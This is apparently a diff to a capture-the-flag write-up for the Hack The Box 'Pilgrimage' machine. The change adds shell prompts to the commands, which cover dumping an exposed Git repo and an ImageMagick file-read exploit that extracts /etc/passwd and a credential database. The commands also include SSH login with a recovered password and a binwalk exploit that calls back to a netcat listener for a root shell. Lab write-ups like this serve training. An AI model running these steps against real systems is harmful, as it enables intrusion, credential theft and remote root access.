@@ -29,7 +29,7 @@ PORT   STATE SERVICE VERSION
 Port 80 redirects to `pilgrimage.htb`, so it goes in `/etc/hosts`:
 
 ```bash
-echo '10.10.11.219 pilgrimage.htb' | sudo tee -a /etc/hosts
+$ echo '10.10.11.219 pilgrimage.htb' | sudo tee -a /etc/hosts
 ```
 
 The app is a PHP image shrinker. Register, log in, upload an image, and it hands back a resized copy under `/shrunk/`. The upload POST is a normal `multipart/form-data` body with the file in `toConvert`, and the response redirects to a `?message=...&status=success` URL pointing at the converted file:
@@ -43,7 +43,7 @@ That `message=` looked like it might be a file include, but feeding it URLs went
 Directory brute force is where it opens up. There is an exposed Git repository:
 
 ```bash
-gobuster dir -u http://pilgrimage.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+$ gobuster dir -u http://pilgrimage.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
 ```
 
 ```
@@ -60,7 +60,7 @@ gobuster dir -u http://pilgrimage.htb -w /usr/share/wordlists/dirbuster/director
 `/.git/` is browsable, so I pulled the entire repo with git-dumper:
 
 ```bash
-git-dumper http://pilgrimage.htb/.git git
+$ git-dumper http://pilgrimage.htb/.git git
 ```
 
 That reconstructed the whole app. `index.php` does the login against a SQLite DB:
@@ -74,7 +74,7 @@ $stmt->execute(array($username,$password));
 The query is a prepared statement, so the login is not injectable. The two things worth keeping from the source are the DB path `/var/db/pilgrimage`, and the fact that the repo ships the `magick` binary the app shells out to for resizing. Fingerprint it:
 
 ```bash
-file ./magick
+$ file ./magick
 ```
 
 ```
@@ -82,7 +82,7 @@ file ./magick
 ```
 
 ```bash
-./magick --version
+$ ./magick --version
 ```
 
 ```
@@ -105,7 +105,7 @@ im.save(args.output, "PNG", pnginfo=info)
 I first proved the bug against `/etc/passwd`, then aimed at the SQLite DB. Generate the PoC PNG, convert it locally to confirm, then upload the original through the web app:
 
 ```bash
-python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
+$ python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
 ```
 
 ```
@@ -118,21 +118,21 @@ python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
 Upload `exploit.png` through the dashboard. The app resizes it and stores the result under `/shrunk/<hash>.png`. I grabbed the converted file back from the server:
 
 ```bash
-wget http://pilgrimage.htb/shrunk/64ea15b80308f.png
+$ wget http://pilgrimage.htb/shrunk/64ea15b80308f.png
 ```
 
 The embedded file is in the `Raw profile type` block of the verbose output, as hex. Strip everything except the hex and reverse it back to bytes:
 
 ```bash
-identify -verbose 64ea15b80308f.png | grep -Pv "^( |Image)" | xxd -r -p > pilgrimage.sqlite
+$ identify -verbose 64ea15b80308f.png | grep -Pv "^( |Image)" | xxd -r -p > pilgrimage.sqlite
 ```
 
 That recovered the actual SQLite database. To sanity-check, the first read I did was `/etc/passwd`, whose hex decoded to the normal passwd file and confirmed `emily:x:1000:1000:emily,,,:/home/emily:/bin/bash` as the human user. Now query the recovered DB:
 
 ```bash
-file pilgrimage.sqlite
+$ file pilgrimage.sqlite
 # SQLite 3.x database
-sqlite3 pilgrimage.sqlite "select username,password from users;"
+$ sqlite3 pilgrimage.sqlite "select username,password from users;"
 ```
 
 ```
@@ -146,7 +146,7 @@ The schema also has an `images` table, but the win is emily's plaintext password
 `emily` reuses that password for SSH:
 
 ```bash
-ssh emily@pilgrimage.htb
+$ ssh emily@pilgrimage.htb
 # password: abigchonkyboi123
 ```
 
@@ -170,7 +170,7 @@ UID=0  /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
 The script:
 
 ```bash
-cat /usr/sbin/malwarescan.sh
+$ cat /usr/sbin/malwarescan.sh
 ```
 
 ```bash
@@ -193,7 +193,7 @@ So as root, every new file in `shrunk/` gets `binwalk -e` run on it, and the fil
 Check the binwalk version:
 
 ```bash
-binwalk
+$ binwalk
 ```
 
 ```
@@ -217,7 +217,7 @@ lines = ['import binwalk.core.plugin\n', 'import os\n', 'import shutil\n',
 Build the malicious PNG from my earlier converted image, pointing the callback at my box:
 
 ```bash
-python3 exp.py result.png 10.10.16.X 4444
+$ python3 exp.py result.png 10.10.16.X 4444
 ```
 
 ```
@@ -227,7 +227,7 @@ You can now rename and share binwalk_exploit and start your local netcat listene
 Then drop `binwalk_exploit.png` into the watched directory and wait for the root job to pick it up:
 
 ```bash
-cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
+$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
 ```
 
 With `nc -lvnp 4444` waiting, `inotifywait` fires, root runs `binwalk -e` on my file, the PFS extractor writes my plugin into `~/.config/binwalk/plugins/`, and binwalk loads and runs it as root. The plugin's `init()` connects back, and I get a root shell and the root flag.
